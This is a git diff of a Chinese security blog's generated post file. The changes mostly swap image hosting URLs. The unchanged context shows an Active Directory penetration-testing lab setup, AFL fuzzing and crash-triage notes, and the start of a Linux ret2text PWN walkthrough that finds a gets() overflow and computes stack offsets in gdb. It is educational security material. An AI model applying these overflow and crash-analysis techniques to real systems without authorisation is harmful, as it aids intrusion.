+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114152358096.png" alt="image-20191114152358096"></p>
 <p>一路下一步，然后点击安装:</p>
-<p><img src="http://file.smilehacker.net/image-20191114152431894.png" alt="image-20191114152431894"></p>
-<p><img src="http://file.smilehacker.net/image-20191114152442053.png" alt="image-20191114152442053"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114152431894.png" alt="image-20191114152431894"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114152442053.png" alt="image-20191114152442053"></p>
 <p>安装完成,之后重启服务器:</p>
-<p><img src="http://file.smilehacker.net/image-20191114152517112.png" alt="image-20191114152517112"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114152517112.png" alt="image-20191114152517112"></p>
 <h3 id="配置-Active-Directory-域服务"><a href="#配置-Active-Directory-域服务" class="headerlink" title="配置 Active Directory 域服务"></a>配置 <strong>Active Directory 域服务</strong></h3><p>开始-&gt;运行-&gt;输入命令:dcpromo</p>
-<p><img src="http://file.smilehacker.net/image-20191114153313193.png" alt="image-20191114153313193"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114153313193.png" alt="image-20191114153313193"></p>
 <p>弹出域服务安装向导,点击下一步。</p>
-<p><img src="http://file.smilehacker.net/image-20191114153449021.png" alt="image-20191114153449021"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114153449021.png" alt="image-20191114153449021"></p>
 <p>一直点击下一步，来到如下页面:</p>
-<p><img src="http://file.smilehacker.net/image-20191114153556548.png" alt="image-20191114153556548"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114153556548.png" alt="image-20191114153556548"></p>
 <p>我们选择“在新林中新建域”。在如下页面输入我们的域名，因为是测试，所以随便写就可以了.</p>
-<p><img src="http://file.smilehacker.net/image-20191114153754047.png" alt="image-20191114153754047"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114153754047.png" alt="image-20191114153754047"></p>
 <p>点击下一步:</p>
-<p><img src="http://file.smilehacker.net/image-20191114153811259.png" alt="image-20191114153811259"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114153811259.png" alt="image-20191114153811259"></p>
 <p>林功能级别选择<code>Windows Server 2008 R2</code> 并点击“下一步”按钮</p>
-<p><img src="http://file.smilehacker.net/image-20191114154004587.png" alt="image-20191114154004587"></p>
-<p><img src="http://file.smilehacker.net/image-20191114154019286.png" alt="image-20191114154019286"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154004587.png" alt="image-20191114154004587"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154019286.png" alt="image-20191114154019286"></p>
 <p>弹出如下页面，再点击下一步即可。</p>
-<p><img src="http://file.smilehacker.net/image-20191114154049538.png" alt="image-20191114154049538"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154049538.png" alt="image-20191114154049538"></p>
 <p>弹出DNS提示框，点击“是“按钮，继续安装</p>
-<p><img src="http://file.smilehacker.net/image-20191114154135110.png" alt="image-20191114154135110"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154135110.png" alt="image-20191114154135110"></p>
 <p>这里不坐任何更改，直接点击下一步;</p>
-<p><img src="http://file.smilehacker.net/image-20191114154211883.png" alt="image-20191114154211883"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154211883.png" alt="image-20191114154211883"></p>
 <p>然后配置还原密码(这个不是域管理员的密码)</p>
-<p><img src="http://file.smilehacker.net/image-20191114154417470.png" alt="image-20191114154417470"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154417470.png" alt="image-20191114154417470"></p>
 <p>等待即可:</p>
-<p><img src="http://file.smilehacker.net/image-20191114154433281.png" alt="image-20191114154433281"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114154433281.png" alt="image-20191114154433281"></p>
 <h2 id="加入域环境"><a href="#加入域环境" class="headerlink" title="加入域环境"></a>加入域环境</h2><p>现在使用<code>win 7</code>来加入当前域，在开始配置前，我们给<code>win7</code>主机分配一个域账号。</p>
-<p><img src="http://file.smilehacker.net/image-20191114163551945.png" alt="image-20191114163551945"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114163551945.png" alt="image-20191114163551945"></p>
 <p>填写信息即可:</p>
-<p><img src="http://file.smilehacker.net/image-20191114163635703.png" alt="image-20191114163635703"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114163635703.png" alt="image-20191114163635703"></p>
 <p>我们可以配置密码为用不过期的（出现问题的看文末怎么解决）:</p>
-<p><img src="http://file.smilehacker.net/image-20191114163851971.png" alt="image-20191114163851971"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114163851971.png" alt="image-20191114163851971"></p>
 <p>成功添加用户。</p>
-<p><img src="http://file.smilehacker.net/image-20191114170700726.png" alt="image-20191114170700726"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170700726.png" alt="image-20191114170700726"></p>
 <p>接下来可以让<code>win7</code>加入域环境了。我们回到<code>win7</code>，配置静态<code>ip</code>如下，要注意<code>DNS</code>的配置，<code>Dns</code>配置的时我们刚刚搭建的<code>DNS</code>服务器，也就是域控的<code>IP</code></p>
-<p><img src="http://file.smilehacker.net/image-20191114171058950.png" alt="image-20191114171058950"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171058950.png" alt="image-20191114171058950"></p>
 <p>然后我们选择计算机，右键属性:</p>
-<p><img src="http://file.smilehacker.net/image-20191114171259378.png" alt="image-20191114171259378"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171259378.png" alt="image-20191114171259378"></p>
 <p>然后进行如下操作：</p>
-<p><img src="http://file.smilehacker.net/image-20191114171358404.png" alt="image-20191114171358404"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171358404.png" alt="image-20191114171358404"></p>
 <p>进行相关设置后，点击确定，会让我们输入用户名和密码，我们填入刚刚添加的用户名密码即可。</p>
-<p><img src="http://file.smilehacker.net/image-20191114171515631.png" alt="image-20191114171515631"></p>
-<p><img src="http://file.smilehacker.net/image-20191114171615809.png" alt="image-20191114171615809"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171515631.png" alt="image-20191114171515631"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171615809.png" alt="image-20191114171615809"></p>
 <p>点击确定后提示欢迎加入域。</p>
-<p><img src="http://file.smilehacker.net/image-20191114171654656.png" alt="image-20191114171654656"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114171654656.png" alt="image-20191114171654656"></p>
 <p>这样就是最简单的环境配置了，后面想要往域中添加其他机器，操作都是类似的，就不做多的讲解了.</p>
 <h2 id="一些其他问题"><a href="#一些其他问题" class="headerlink" title="一些其他问题:"></a>一些其他问题:</h2><h4 id="当我们输入net-view-domian回显如下"><a href="#当我们输入net-view-domian回显如下" class="headerlink" title="当我们输入net view /domian回显如下:"></a>当我们输入<code>net view /domian</code>回显如下:</h4><p>发生错误6118</p>
-<p><img src="http://file.smilehacker.net/image-20191114162852506.png" alt="image-20191114162852506"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114162852506.png" alt="image-20191114162852506"></p>
 <p>解决方法：</p>
 <ol>
 <li>关闭防火墙</li>
@@ -336,27 +336,27 @@ if __name__ == &quot;__main__&quot;:
 </ol>
 </li>
 </ol>
-<p><img src="http://file.smilehacker.net/image-20191114163136190.png" alt="image-20191114163136190"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114163136190.png" alt="image-20191114163136190"></p>
 <p>问题解决:</p>
-<p><img src="http://file.smilehacker.net/image-20191114163304741.png" alt="image-20191114163304741"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114163304741.png" alt="image-20191114163304741"></p>
 <h4 id="密码复杂性策略"><a href="#密码复杂性策略" class="headerlink" title="密码复杂性策略"></a>密码复杂性策略</h4><p>设置密码为123456时会提示。</p>
-<p><img src="http://file.smilehacker.net/image-20191114164402084.png" alt="image-20191114164402084"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114164402084.png" alt="image-20191114164402084"></p>
 <p>我们配置的密码都必须非常的复杂，我们自己都记不住，所以关掉它。</p>
 <p><strong>这里的配置跟印象中的配置有一点不一样</strong></p>
 <p>开始-&gt;管理工具-&gt;组策略管理</p>
-<p><img src="http://file.smilehacker.net/image-20191114165948277.png" alt="image-20191114165948277"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114165948277.png" alt="image-20191114165948277"></p>
 <p>找到如下选项，选择编辑</p>
-<p><img src="http://file.smilehacker.net/image-20191114170039988.png" alt="image-20191114170039988"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170039988.png" alt="image-20191114170039988"></p>
 <p>然后找到如下设置,关闭之后我们就搞定了:</p>
-<p><img src="http://file.smilehacker.net/image-20191114170216644.png" alt="image-20191114170216644"></p>
-<p><img src="http://file.smilehacker.net/image-20191114170247404.png" alt="image-20191114170247404"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170216644.png" alt="image-20191114170216644"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170247404.png" alt="image-20191114170247404"></p>
 <p>之后子啊命令行中更新策略:</p>
 <blockquote>
 <p> gpupdate /force </p>
 </blockquote>
-<p><img src="http://file.smilehacker.net/image-20191114170630127.png" alt="image-20191114170630127"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170630127.png" alt="image-20191114170630127"></p>
 <p>问题解决:</p>
-<p><img src="http://file.smilehacker.net/image-20191114170651582.png" alt="image-20191114170651582"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114170651582.png" alt="image-20191114170651582"></p>
 ]]></content>
       <categories>
         <category>内网</category>
@@ -380,7 +380,7 @@ cd afl-2.52b
 make 
 sudo make install</code></pre>
 <p>不出意外可以直接编译成功,之后在终端输入<code>afl-</code>,按两下<code>tab</code>,会出现一些命令</p>
-<p><img src="http://file.smilehacker.net/1570950620531.png" alt="1570950620531"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570950620531.png" alt="1570950620531"></p>
 <a id="more"></a>
 
 
@@ -472,12 +472,12 @@ AFL_USE_ASAN=1 make</code></pre>
 <p>运行<code>afl-fuzz</code></p>
 <pre><code class="shell">afl-fuzz -i afl_in/ -o afl_out/ ./afl_test -f</code></pre>
 <p>此处如果第一次运行会报一个错误</p>
-<p><img src="http://file.smilehacker.net/1571209319832.png" alt="1571209319832"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571209319832.png" alt="1571209319832"></p>
 <pre><code class="shell">Pipe at the beginning of &#39;core_pattern&#39;</code></pre>
 <p>解决方法如下:</p>
 <pre><code class="shell">sudo su
 echo core &gt;/proc/sys/kernel/core_pattern</code></pre>
-<h3 id="Fuzz运行界面"><a href="#Fuzz运行界面" class="headerlink" title="Fuzz运行界面"></a>Fuzz运行界面</h3><p><img src="http://file.smilehacker.net/1570957117241.png" alt="1570957117241"></p>
+<h3 id="Fuzz运行界面"><a href="#Fuzz运行界面" class="headerlink" title="Fuzz运行界面"></a>Fuzz运行界面</h3><p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570957117241.png" alt="1570957117241"></p>
 <p>下面选择界面上几个重要的部分来介绍一下</p>
 <ul>
 <li><p>process timing :</p>
@@ -519,30 +519,30 @@ echo core &gt;/proc/sys/kernel/core_pattern</code></pre>
 <p>以上是运行界面常用的关注点, 想要查看具体的介绍请查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a></p>
 <h3 id="Crash分析"><a href="#Crash分析" class="headerlink" title="Crash分析"></a>Crash分析</h3><p>通过上图，稍微跑了不到一分钟，发现了5个<code>crash</code></p>
 <p>查看<code>afl_out</code>生成的文件:</p>
-<p><img src="http://file.smilehacker.net/1570955956378.png" alt="1570955956378"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570955956378.png" alt="1570955956378"></p>
 <ul>
 <li><code>crashes</code> : 存放使程序产生<code>crash</code>的样例</li>
 <li><code>hangs</code> : 使程序产生超时的样例</li>
 <li><code>queue</code>: 存放每个不同执行路径的用例</li>
 </ul>
 <p>我们来看看<code>crashes</code> 目录下的几个样例</p>
-<p><img src="http://file.smilehacker.net/1570957526718.png" alt="1570957526718"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570957526718.png" alt="1570957526718"></p>
 <p>想要具体分析，我们只需要把得到的<code>crash</code>文件作为参数输入到程序中，使用gdb调试分析就可以得到详细的结果。在分析之前先用<code>xxd</code>命令查看下文件内容，对产生的异常做一个初步判断。</p>
 <ul>
 <li><p>可能为缓冲区溢出：</p>
-<p><img src="http://file.smilehacker.net/1570957848925.png" alt="1570957848925"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570957848925.png" alt="1570957848925"></p>
 </li>
 <li><p>可能为预期内的异常,<code>F</code>开头且长度为6</p>
-<p><img src="http://file.smilehacker.net/1570957969884.png" alt="1570957969884"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570957969884.png" alt="1570957969884"></p>
 </li>
 <li><p>缓冲区溢出？</p>
-<p><img src="http://file.smilehacker.net/1570958012787.png" alt="1570958012787"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570958012787.png" alt="1570958012787"></p>
 </li>
 <li><p>根据源代码基本可以确定为格式化字符串漏洞</p>
-<p><img src="http://file.smilehacker.net/1570958072893.png" alt="1570958072893"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570958072893.png" alt="1570958072893"></p>
 </li>
 <li><p>可能使预料中的异常</p>
-<p><img src="http://file.smilehacker.net/1570958118182.png" alt="1570958118182"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570958118182.png" alt="1570958118182"></p>
 </li>
 </ul>
 <p>在文末补充具体的异常调试</p>
@@ -557,9 +557,9 @@ make</code></pre>
 <pre><code class="shel">sudo ln -s /home/tt/afl-2.52b/afl-clang-fast[源路径] /usr/local/bin/afl-clang-fast[目标路径]</code></pre>
 <h3 id="llvm-model编译代码"><a href="#llvm-model编译代码" class="headerlink" title="llvm model编译代码"></a><code>llvm model</code>编译代码</h3><p>使用<code>afl-clang-fast</code>编译最初存在漏洞的代码</p>
 <pre><code class="shell">afl-clang-fast -g afl_test.c -o afl_test</code></pre>
-<p><img src="http://file.smilehacker.net/1571023550045.png" alt="1571023550045"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571023550045.png" alt="1571023550045"></p>
 <h3 id="开始Fuzz-1"><a href="#开始Fuzz-1" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><pre><code class="shell">afl-fuzz -i afl_in -o afl_out ./afl_test -f</code></pre>
-<p><img src="http://file.smilehacker.net/1571023823108.png" alt="1571023823108"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571023823108.png" alt="1571023823108"></p>
 <h2 id="无源码的AFL测试-Qemu模式"><a href="#无源码的AFL测试-Qemu模式" class="headerlink" title="无源码的AFL测试-Qemu模式"></a>无源码的AFL测试-Qemu模式</h2><h3 id="安装Qemu"><a href="#安装Qemu" class="headerlink" title="安装Qemu"></a>安装<code>Qemu</code></h3><p>还有一些情况我们根本拿不到程序的代码，没有办法对源码进行插桩，不过<code>AFL</code>提供了<code>qemu</code>模式进行测试</p>
 <pre><code class="shell">cd afl-2.52b/qemu-mode
 
@@ -567,7 +567,7 @@ make</code></pre>
 cd ..
 make install </code></pre>
 <p>有可能在执行<code>./build_qemu_support.sh</code>时出现如下错误</p>
-<p><img src="http://file.smilehacker.net/1570980361643.png" alt="1570980361643"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570980361643.png" alt="1570980361643"></p>
 <p>执行如下代码即可:</p>
 <pre><code class="shell">wget http://mirrors.kernel.org/gnu/libtool/libtool-2.2.6b.tar.gz \
 &amp;&amp; tar xzvf libtool-2.2.6b.tar.gz \
@@ -579,13 +579,13 @@ make &amp;&amp; sudo make install
 ###############或者#############
 sudo apt-get install libtool-bin</code></pre>
 <p>编译成功:</p>
-<p><img src="http://file.smilehacker.net/1570981177555.png" alt="1570981177555"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570981177555.png" alt="1570981177555"></p>
 <p>回到代码目录,使用<code>gcc</code>重新编译测试代码，并重新执行<code>afl-fuzz</code>命令(这次加上<code>-Q</code>)</p>
 <pre><code class="shell">gcc afl_test.c -o afl_test
 
 afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</code></pre>
 <p>有可能碰到如下错误:</p>
-<p><img src="http://file.smilehacker.net/1570982707245.png" alt="1570982707245"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570982707245.png" alt="1570982707245"></p>
 <p>解决方法:</p>
 <pre><code class="shell">vim ~/.bashrc
 
@@ -593,7 +593,7 @@ afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</code></pre>
 export AFL_PATH=/home/tt/afl-2.52b #你的afl-qemu-trace所在路径，如果根据文章走下来,那就是你的afl源码目录
 
 source ~/.bashrc # 重新加载</code></pre>
-<p><img src="http://file.smilehacker.net/1570982887916.png" alt="1570982887916"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1570982887916.png" alt="1570982887916"></p>
 <p>重新运行,已经成功运行了,但是对比一下两个模式，会发现在<code>Qemu</code>模式下的速度比源码编译插桩的速度慢了很多。</p>
 <h2 id="AFL-Fuzz结果分析"><a href="#AFL-Fuzz结果分析" class="headerlink" title="AFL Fuzz结果分析"></a>AFL Fuzz结果分析</h2><h3 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h3><p> <code>afl-fuzz</code>永远不会停止，所以何时停止测试很多时候就是依靠<code>afl-fuzz</code>提供的状态来决定的。具体的几种方式如下所示: </p>
 <ul>
@@ -624,7 +624,7 @@ source ~/.bashrc # 重新加载</code></pre>
 <h4 id="triage-crashes-sh"><a href="#triage-crashes-sh" class="headerlink" title="triage_crashes.sh"></a>triage_crashes.sh</h4><p> AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 </p>
 <p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p>
 <pre><code class="shell">sh /home/tt/afl-2.52b/experimental/crash_triage/triage_crashes.sh ./afl_out ./afl_test  2&gt;&amp;1 | grep SIGNAL</code></pre>
-<p><img src="http://file.smilehacker.net/1571025845455.png" alt="1571025845455"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571025845455.png" alt="1571025845455"></p>
 <p>根据输出的11可以做一个大概的判断，但是具体还是需要手动调试</p>
 <h4 id="推荐两个分析结果的工具"><a href="#推荐两个分析结果的工具" class="headerlink" title="推荐两个分析结果的工具"></a>推荐两个分析结果的工具</h4><ul>
 <li>(afl-content)[ <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="noopener">https://github.com/rc0r/afl-utils</a> ] afl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。 </li>
@@ -633,7 +633,7 @@ source ~/.bashrc # 重新加载</code></pre>
 <h3 id="代码覆盖率-afl-cov"><a href="#代码覆盖率-afl-cov" class="headerlink" title="代码覆盖率:  afl-cov"></a>代码覆盖率:  <code>afl-cov</code></h3><p>后面补充，现在有一点问题</p>
 <h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>对上面文章做一些补充</p>
 <h3 id="缓冲区溢出分析"><a href="#缓冲区溢出分析" class="headerlink" title="缓冲区溢出分析"></a>缓冲区溢出分析</h3><p>使用<code>GDB</code>对缓冲区进行实际分析，在分析前先来看下猜测为导致缓冲区溢的<code>case</code>:</p>
-<p><img src="http://file.smilehacker.net/1571209606024.png" alt="1571209606024"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571209606024.png" alt="1571209606024"></p>
 <p>接下来使用<code>GDB</code>加载程序</p>
 <pre><code class="shell">gdb afl_test
 
@@ -641,11 +641,11 @@ source ~/.bashrc # 重新加载</code></pre>
 
 run &lt; stackoverflow</code></pre>
 <p>这里对文件进行了重命名，不然在<code>gdb</code>中导入会有一点问题。</p>
-<p><img src="http://file.smilehacker.net/1571209574876.png" alt="1571209574876"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571209574876.png" alt="1571209574876"></p>
 <p>程序运行后,找到产生<code>crash</code>位置,</p>
-<p><img src="http://file.smilehacker.net/1571209819953.png" alt="1571209819953"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571209819953.png" alt="1571209819953"></p>
 <p> 通过栈回溯信息可以看到，程序发生了栈溢出[启用了 canary ,导致栈检查失败，随后奔溃]： </p>
-<p><img src="http://file.smilehacker.net/1571209729037.png" alt="1571209729037"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/AFL_Fuzzing_study_notes/1571209729037.png" alt="1571209729037"></p>
 ]]></content>
       <categories>
         <category>Fuzz</category>
@@ -881,9 +881,9 @@ if __name__ == &#39;__main__&#39;:
 <p>checksec pwn1</p>
 </blockquote>
 <a id="more"></a>
-<p><img src="http://file.smilehacker.net/1571474474731.png" alt="checksec pwn1"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571474474731.png" alt="checksec pwn1"></p>
 <p>可以看到开启了<code>NX enabled</code>保护。使用<code>IDA</code>查看下程序的代码</p>
-<p><img src="http://file.smilehacker.net/1571474770735.png" alt="IDA加载程序"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571474770735.png" alt="IDA加载程序"></p>
 <p>发现程序调用了<code>gets</code>函数，并且没有做任何的处理，可以造成了缓冲区溢出。我们需要分析<code>&amp;s</code>到<code>EBP</code>的距离，因为<code>EBP</code>后存放的就是返回地址。 在32位的程序中，就是<code>ebp+4</code>。<code>Esp -&gt; ebp</code>, 地址从小到大。小地址栈顶，大地址栈底。 </p>
 <h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p>
 <p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p>
@@ -902,7 +902,7 @@ Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
 pwndbg&gt; r #运行程序
 </code></pre>
 <p>运行结果如下:</p>
-<p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
 <p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p>
 <pre><code class="shell">ESP = 0xffffcfa0
 EBP = 0Xffffd028
